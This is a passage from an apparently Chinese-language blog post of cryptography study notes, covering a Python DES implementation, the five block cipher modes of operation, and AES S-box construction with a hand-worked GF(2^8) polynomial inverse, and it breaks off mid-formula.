class="hljs-comment">#密文/明文前面全部为零的情况下直接转化为16进制可能少位数，需要补零</span><br>        data_code_hex = <span class="hljs-string">&quot;0&quot;</span> + data_code_hex<br>    <span class="hljs-keyword">if</span> (mod == <span class="hljs-string">&quot;decode&quot;</span>):<br>        data_code_alpha = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>):<br>            bytes_ascii = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(data_code_hex[i * <span class="hljs-number">2</span> : i * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>], <span class="hljs-number">16</span>))<br>            data_code_alpha += bytes_ascii<br>        <span class="hljs-keyword">return</span> data_code_alpha<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> data_code_hex<br><br>result = des(<span class="hljs-string">&quot;flagyyds&quot;</span>, <span class="hljs-string">&quot;wuuconix&quot;</span>, <span class="hljs-string">&quot;encode&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des加密结果:<span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>result = des(<span class="hljs-string">&quot;46edc4a79ab0f007&quot;</span>, <span class="hljs-string">&quot;wuuconix&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des解密结果:<span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210914225039663.png" alt="result" /></p><h2 id="block-ciphermode-of-operation"><a class="markdownIt-Anchor" href="#block-ciphermode-of-operation"></a> Block Cipher——Mode of Operation</h2><p>由于分组密码加密的对象都是二进制位，而我们输入的明文一般都是字母，比如DES要求明文位64位，也就是8个字母，但是我们实际上要加密的数据肯定不止64位，实际工作中就需要对数据进行处理。分组密码主要有5种工作模式。</p><ol><li><p>ECB <code>Electronic Codebook Book 电码本模式</code>。这个思想十分简单 ，就是把明文和密文分组，每组就是那个我们需要的位数。</p><p>因为每组独立，无错误传播。还可以并行处理。</p><p>但是它也有缺点，就是这种方式当某两组的明文同样的话，由于它们的密钥是相同的56位密钥，这就导致它们加密出来的结果也是一样的。</p><p>以下是用ECB方式加密的图片，表现出了明显的轮廓特征。所以一般ECB只会用来加密一些长度很小的内容，比如加密密钥 。</p><p><img src="https://upyun.wuuconix.link/image-20210915193846764.png" alt="ECB Plaintext" /></p><p><img src="https://upyun.wuuconix.link/image-20210915193925323.png" alt="ECB Ciphertext" /></p></li><li><p>CBC <code>Cipher Block Chaining 密文链接模式</code>。CBC的特点就是它的每一组的密文都会影响到下一组的加密，因为它和下一组的明文做了按位与的操作。同时由于除了第一组外每一组都会接受前面一组的密文，为了保证统一性，第一组明文会给它一个初始向量<code>IV</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210915194235392.png" alt="CBC流程图" /></p><p>我们可以很容易知道，CBC会有错误传播，也就是说前一轮密文的错误会影响到后一轮的密文。同时因为一环扣一环，无法做到并行处理。</p><p>有错误传播不是说这个工作模式就不好，因为我们有时候就需要让它错误传播，比如一份重要的文件加密，我们要防止别人篡改其中的某一位。而错误传播就可以让这个微小的修改被无限放大而让接收者知道这份文件发生了错误 。</p><p>由于不同组的明文会收到之前密文的影响，这就导致相同的明文会加密出不同的密文。这就避免了暴露明文的数据模式。</p><p><img src="https://upyun.wuuconix.link/image-20210915195205044.png" alt="CBC 明文" /></p><p><img src="https://upyun.wuuconix.link/image-20210915195222433.png" alt="CBC密文" /></p></li></ol><p>还有三种工作模式分别是CFB <code>Cipher Feedback 密文反馈模式</code>, OFB <code>Output Feedback 输出反馈模式</code>, CTR<code>Counter Mode 计数器模式</code>。<br />它们的方式都非常奇怪，明文本身没有参与DES加密，进行加密的是初始向量，然后用初始向量的加密结果和8位明文进行按位与。对，因为明文本身不参与DES加密，所以它每组没有把明文分成64位每组，而可以分成更加遍历的位数。甚至可以每组1位，十分牛逼。</p><ol start="3"><li><p>CFB <code>Cipher Feedback 密文反馈模式</code>。明文是和某个向量经过DES的结果的左边j位进行按位与。同时把密文移动到下个向量的右边j位。</p><p>由于每次对明文产生影响的只有j位，可能这样就导致了错误传播得不会太远。这是它得一个特点。错误传播有界。</p></li></ol><p><img src="https://upyun.wuuconix.link/image-20210915200615612.png" alt="CFB" /></p><ol start="4"><li><p>OFB <code>Output Feedback 输出反馈模式</code>。和CFB类似，但是OFB中影响下一个向量的j位不是上一组的密文，而是直接由上一组向量的加密结果的左j位。所以这就导致密文的错误不会传播。</p><p>还是和之前说的一样，无错误传播不一定好，我们无法确定密文是否被篡改。所以这使用于冗余度较大的图片视频等错了几位不怕的数据。OFB经常被用来加密卫星的传输。</p></li></ol><p><img src="https://upyun.wuuconix.link/image-20210915200823787.png" alt="OFB" /></p><ol start="5"><li><p>CTR <code>Counter Mode 计数器模式</code>相比前两个CFB和OFB就简单多了，也没有初始向量，上一组的输出或者密文也不会影响到下一组。</p><p>这让它可以并行处理。还可以随机区块解密，不用必须从后往前全部解一遍。</p></li></ol><p><img src="https://upyun.wuuconix.link/image-20210915200859470.png" alt="CTR" /></p><h2 id="aes"><a class="markdownIt-Anchor" href="#aes"></a> AES</h2><p>Advanced Encryption Standard。高级加密标准。其设计出来便是为了代替因为密钥位数太少而已经不安全的DES</p><p>AES提供了3种不同的规格，按照实际需求进行选择，十分灵活，具体参数如下。</p><div class="center"><table><thead><tr><th style="text-align:center">密钥长度</th><th style="text-align:center">128</th><th style="text-align:center">192</th><th style="text-align:center">256</th></tr></thead><tbody><tr><td style="text-align:center">分组长度</td><td style="text-align:center">128</td><td style="text-align:center">128</td><td style="text-align:center">128</td></tr><tr><td style="text-align:center">轮数</td><td style="text-align:center">10</td><td style="text-align:center">12</td><td style="text-align:center">14</td></tr><tr><td style="text-align:center">轮密钥长度</td><td style="text-align:center">128</td><td style="text-align:center">128</td><td style="text-align:center">128</td></tr></tbody></table></div><p>我们可以看见，就算是最低规格的AES，都远比DES的位数长的多。</p><p>我们再来看AES的加密流程。</p><p><img src="https://upyun.wuuconix.link/image-20211002134126734.png" alt="AES流程" /></p><p>我们先来看其中最重要的S盒。AES的S盒盒DES的S盒不一样，AES的S盒是可以算出来的，而DES只是给你一堆数，不知道这些数是怎么的出来的。</p><p>AES S盒替换又叫做字节代替，其操作就是把明文的的每个字节进行整体代替，相当于把一个字节换成另一个完全不一样的字节。而DES中做法是输入48位二进制，因为 有8个S盒，故分为8组，每组6位二进制，第一位和最后一位组成行，中间4位组成列，在S表中进行定位元素，表中的元素都是4位的，整体S盒是48位输入，32位输出。而AES的S盒实际上比DES的S盒简单的多，因为AES只有一个S盒。这个S盒为16行，16列的正方形。</p><p>它的行对应AES输入字节的前八位，它的列对应AES输入字节的后八位，S表的每个元素都是一个字节，所以就实现了输入一个字节，然后替换为另一个字节。</p><p><img src="https://upyun.wuuconix.link/image-20211002135256589.png" alt="AES S盒替换" /></p><p>如果要利用查表得话，程序实现起来也是非常得简单。</p><p>但是我们之前也说过，这个S表实际上是算出来得。也就是我们可以根据一个字节，然后手动计算出输出，不用查表。</p><p><img src="https://upyun.wuuconix.link/image-20211002135435780.png" alt="字节代替算法" /></p><p>实际上是把输入得字节转化为一个多项式，然后求这个多项式得逆，再把这个逆转化为二进制，然后乘上一一个矩阵，再加上一个矩阵。</p><p>听起来挺简单得，但是以我目前的知识，我无法利用python实现多项式的表示，更别说求多项式的逆了。numpy貌似可以解决这个问题，之后再研究吧。</p><p>这里就用一个例子手动演示一下计算过程吧！</p><p>假设我么输入的字节为<code>0x53</code>，即<code>01010011</code>。</p><ol><li><p>其对应的多项式为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>1</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^6+x^4+x^1+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</p></li><li><p>然后需要求该多项式在模<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^8+x^4+x^3+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>意义下的逆，这个8次多项式是伽罗华域里面指定的，说实话我不太懂2333。</p></li><li><p>和整数的求逆的过程类似，先写出它的辗转相除的过程。（利用多项式除法 注意 在模意义下 加和减等效）</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^8+x^4+x^3+x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> = <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">(x^2+1)*(x^6+x^4+x^1+1)+x^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>1</mn></msup><mo>+</mo><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo>∗</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x^6+x^4+x^1+1 = (x^4+x^2)*x^2+(x+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2 = (x+1)*(x+1)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>然后开始手动推逆。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = x^2 + (x+1)*(x+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>    //减直接等效为加来简化运算</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 = x^2 + (x+1) * ((x^6 + x^4+x+1)+x^2*(x^4+x^2))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span 